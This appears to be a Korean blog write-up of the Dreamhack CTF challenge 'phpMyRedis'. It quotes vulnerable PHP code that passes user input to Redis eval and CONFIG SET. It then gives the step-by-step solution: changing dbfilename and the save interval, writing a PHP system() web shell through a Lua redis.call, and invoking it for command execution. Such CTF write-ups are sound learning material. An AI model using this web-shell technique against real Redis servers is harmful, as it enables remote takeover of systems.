---
title: "[2025-07-25] phpMyRedis"
excerpt: "Redis injection"

categories:
  - Problem
tags:
  - [NoSQL injection, Redis]

permalink: /Problem/[2025-07-25] phpMyRedis/

toc: true
toc_sticky: true

date: 2025-07-25
last_modified_at: 2025-07-25
---

## 🦥 본문

- index.php

```php
<?php 
                    if(isset($_POST['cmd'])){
                        $redis = new Redis();
                        $redis->connect($REDIS_HOST);
                        $ret = json_encode($redis->eval($_POST['cmd']));
                        echo '<h1 class="subtitle">Result</h1>';
                        echo "<pre>$ret</pre>";
                        if (!array_key_exists('history_cnt', $_SESSION)) {
                            $_SESSION['history_cnt'] = 0;
                        }
                        $_SESSION['history_'.$_SESSION['history_cnt']] = $_POST['cmd'];
                        $_SESSION['history_cnt'] += 1;

                        if(isset($_POST['save'])){
                            $path = './data/'. md5(session_id());
                            $data = '> ' . $_POST['cmd'] . PHP_EOL . str_repeat('-',50) . PHP_EOL . $ret;
                            file_put_contents($path, $data);
                            echo "saved at : <a target='_blank' href='$path'>$path</a>";
                        }
                    }
                ?>
                
<?php
                        for($i=0; $i<$_SESSION['history_cnt']; $i++){
                            echo "<li>".$_SESSION['history_'.$i]."</li>";
                        }
                    ?>
```

POST[’cmd’]

- POST 요청에 cmd 값이 포함되면 실행
- 레디스를 실행. `$POST[’cmd’]` 값을 실행 시켜서 보여줌
- 세션에 `history_cnt` 값이 없다면 0으로 할당
- `history_(history_cnt 값)` 으로 `$POST[’cmd’]` 값을 저장
    - 저장 후 `history_cnt` 값 1 증가
    - history_0, history_1… 형태로 저장

POST[’save’]

- POST 요청에 save 값이 포함되면 실행
- ./data/ 폴더 아래에 세션 ID를 해쉬 함수를 통해 해싱하여 파일명으로 파일 저장. 아래와 같이 저장
    
    ```php
    > $POST[’cmd’] 값
    -------------------------------------
    $POST[’cmd’] 명령어 실행 결과 
    ```
    
- 저장된 파일 링크 출력

- config.php

```
 <?php 
                    if(isset($_POST['option'])){
                        $redis = new Redis();
                        $redis->connect($REDIS_HOST);
                        if($_POST['option'] == 'GET'){
                            $ret = json_encode($redis->config($_POST['option'], $_POST['key']));
                        }elseif($_POST['option'] == 'SET'){
                            $ret = $redis->config($_POST['option'], $_POST['key'], $_POST['value']);
                        }else{
                            die('error !');
                        }                        
                        echo '<h1 class="subtitle">Result</h1>';
                        echo "<pre>$ret</pre>";
                    }
                ?>
```

POST[’option’]

- POST 요청에 option 값이 포함되면 실행
- 레디스 실행.
- 사용자가 보낸 값이 GET인 경우에 `redis.config()` 실행
    - CONFIG GET `$_POST['key']` 값 실행
    - 즉 설정 중 `$_POST['key']` 값을 조회
- 사용자가 보낸 값이 SET인 경우
    - CONFIG SET `$_POST['key']` 값, `$_POST['value']` 값 실행
    - 즉 설정 중에 `$_POST['key']` 값을 키로 가지고 `$_POST['value']` 값을 value로 갖는 새로운 설정 입력
- 위의 명령어를 실행한 결과값을 출력

흠… 코드 이해하는 데만 한참 걸렸다. 지금 생각하는 큰 동작 흐름은 이러하다

1. config.php에서 CONFIG SET 을 통해서  파일 경로와 파일명을 설정한다.
    
    ```php
    CONFIG SET dir /tmp
    CONFIG SET dbfilename hack.php
    ```
    
2. index.php에서 $POST[’cmd’]와 $POST[’save’]를 통해 
    
    ```php
    SET 키 값 "<?php system($_GET['cmd']); ?>" 
    SAVE
    ```
    
    위의 코드를 실행 시키고 저장한다.
    
3. 저장된 위치에서 php를 실행시켜서 웹쉘을 실행시켜서 취약점을 탐색한다.

설정한 파일 경로에 있는 php 파일을 실행시킨다.

근데 2번과 같은 코드를 직접 입력하면 false가 출력. 즉 실행하는 데 실패한다

→ eval()의 인자는 lua 스크립트를 실행시키는 용도이므로 다른 방식으로 전달

→ `return redis.call("set", "test", "<?php system($_GET['cmd']); ?>");`

마찬가지로 return redis.call('SAVE')를 입력했는 데 false 가 출력된다

→ SAVE는 lua 스크립트로 실행이 불가하고 직접 호출해야 한다($redis->save();)

세이브만 시키면 되는데…

md5()가 세션 ID로 해싱을 하는 데 세션 ID를 조작하여 파일명을 변경할 수 있게 하면 어떨까라는 발칙한 상상을 해봤다. 하지만 md5()가 단방향 해싱이고 32자리 16진수 해싱을 하기 때문에 못한다는 gpt의 의견이 있었다.

아… Config Set에서 저장 주기를 정할 수 있던 것이었다…….

### 풀이

1. config.php에서 CONFIG SET 을 통해서  파일 경로와 파일명, 저장 주기를 설정한다.
    
    ```php
    CONFIG GET dir        // 현재 저장 경로 조회
    CONFIG SET dbfilename hack.php
    CONFIG SET save 10 1 // save 몇 초안에 몇 개가 생겨야 저장 -> 10초 내 1개 
    ```
    
2. index.php에서 $POST[’cmd’]와 $POST[’save’]를 통해 
    
    ```php
    return redis.call("set", "test", "<?php system($_GET['cmd']); ?>");
    ```
    
    위의 코드를 실행 시키고 저장한다.
    
3. 저장된 위치에서 php를 실행시켜서 웹쉘을 실행시켜서 취약점을 탐색한다.
    - http://host3.dreamhack.games:9158//hack.php?cmd=/flag